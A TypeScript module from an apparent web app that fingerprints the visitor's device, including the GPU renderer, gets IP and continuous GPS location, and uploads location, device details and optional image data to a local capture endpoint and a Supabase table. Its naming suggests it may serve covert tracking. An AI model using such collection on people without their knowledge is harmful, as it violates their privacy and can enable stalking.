import { supabase, isSupabaseConfigured } from '../supabaseClient';
import { UserLocation, LogEntry, DeviceInfo } from '../types';

// Helper to get detailed device info
export const getDeviceInfo = (): DeviceInfo => {
  const nav = navigator as any; // Cast to any to access non-standard APIs
  
  let gpuRenderer = 'Unknown';
  try {
    const canvas = document.createElement('canvas');
    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
    if (gl) {
      const debugInfo = (gl as WebGLRenderingContext).getExtension('WEBGL_debug_renderer_info');
      if (debugInfo) {
        gpuRenderer = (gl as WebGLRenderingContext).getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
      }
    }
  } catch (e) {
    // Ignore error
  }

  return {
    userAgent: nav.userAgent,
    platform: nav.platform || nav.userAgentData?.platform || 'Unknown',
    screenResolution: `${window.screen.width}x${window.screen.height}`,
    windowSize: `${window.innerWidth}x${window.innerHeight}`,
    language: nav.language,
    cores: nav.hardwareConcurrency,
    memory: nav.deviceMemory,
    connectionType: nav.connection ? nav.connection.effectiveType : 'unknown',
    touchSupport: nav.maxTouchPoints > 0,
    gpuRenderer: gpuRenderer
  };
};

export const getIpLocation = async (): Promise<UserLocation | null> => {
  const providers = [
    {
      name: 'geojs.io',
      url: 'https://get.geojs.io/v1/ip/geo.json',
      transform: (data: any) => ({ lat: parseFloat(data.latitude), lng: parseFloat(data.longitude), ip: data.ip })
    },
    {
      name: 'ipapi.co',
      url: 'https://ipapi.co/json/',
      transform: (data: any) => ({ lat: data.latitude, lng: data.longitude, ip: data.ip })
    },
    {
      name: 'ipwho.is',
      url: 'https://ipwho.is/',
      transform: (data: any) => {
        if (!data.success) throw new Error('ipwho.is reported failure');
        return { lat: data.latitude, lng: data.longitude, ip: data.ip };
      }
    }
  ];

  for (const provider of providers) {
    try {
      const response = await fetch(provider.url);
      if (!response.ok) continue; 
      
      const data = await response.json();
      const info = provider.transform(data);
      
      // Fix: Strictly check if lat/lng are valid numbers and not NaN
      if (typeof info.lat === 'number' && typeof info.lng === 'number' && !isNaN(info.lat) && !isNaN(info.lng)) {
        return {
          lat: info.lat,
          lng: info.lng,
          accuracy: 5000,
          timestamp: Date.now(),
          source: 'ip',
          ip: info.ip
        };
      }
    } catch (err) {
      console.warn(`Provider ${provider.name} failed:`, err);
    }
  }

  return {
    lat: -6.2088,
    lng: 106.8456,
    accuracy: 10000,
    timestamp: Date.now(),
    source: 'ip',
    ip: '127.0.0.1'
  };
};

export const saveLocationToBackend = async (
  location: UserLocation, 
  deviceId: string,
  imageData?: string, 
  currentIp?: string,
  deviceInfo?: DeviceInfo
): Promise<LogEntry> => {
  const newEntry: LogEntry = {
    id: crypto.randomUUID(),
    latitude: location.lat,
    longitude: location.lng,
    device_id: deviceId,
    ip_address: currentIp || location.ip || 'Unknown',
    image_data: imageData,
    device_info: deviceInfo,
    created_at: new Date().toISOString(),
    status: 'local_simulation'
  };

  // 1. Send to Local Node Server (for File System saving)
  try {
    fetch('/api/capture', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        device_id: deviceId,
        latitude: location.lat,
        longitude: location.lng,
        image_data: imageData, // This will be saved to 'uploads' folder by server.js
        device_info: deviceInfo,
        timestamp: Date.now()
      })
    }).catch(err => console.error("Local upload failed (dev mode?):", err));
  } catch (e) {
    // Ignore local server errors if running in standalone mode
  }

  // 2. Sync to Supabase (Database)
  if (isSupabaseConfigured && supabase) {
    try {
      // Explicitly define payload to avoid undefined values which might cause issues
      const payload = { 
        latitude: location.lat, 
        longitude: location.lng, 
        device_id: deviceId,
        ip_address: newEntry.ip_address ?? null,
        image_data: imageData ?? null,
        device_info: deviceInfo ? JSON.parse(JSON.stringify(deviceInfo)) : null // Ensure clean JSON
      };

      const { error } = await supabase
        .from('user_locations')
        .insert([payload]);

      if (!error) {
        newEntry.status = 'synced';
      } else {
        // Fix: Log specific error properties instead of the object wrapper which shows as [object Object]
        console.error('Supabase Sync Error:', {
          message: error.message,
          code: error.code,
          details: error.details,
          hint: error.hint
        });
      }
    } catch (err) {
      console.error('Supabase Exception:', err);
    }
  }

  return newEntry;
};

export const getBrowserLocation = (
  onSuccess: (loc: UserLocation) => void,
  onError: (error: GeolocationPositionError) => void
): number => {
  if (!navigator.geolocation) {
    onError({ code: 0, message: "Geolocation not supported" } as GeolocationPositionError);
    return 0;
  }

  const options = {
    enableHighAccuracy: true,
    timeout: 30000, // Increased to 30s to allow GPS lock on mobile
    maximumAge: 0   // Force fresh readings
  };

  const id = navigator.geolocation.watchPosition(
    (position) => {
      onSuccess({
        lat: position.coords.latitude,
        lng: position.coords.longitude,
        accuracy: position.coords.accuracy,
        timestamp: position.timestamp,
        source: 'gps'
      });
    },
    (error) => {
      onError(error);
    },
    options
  );

  return id;
};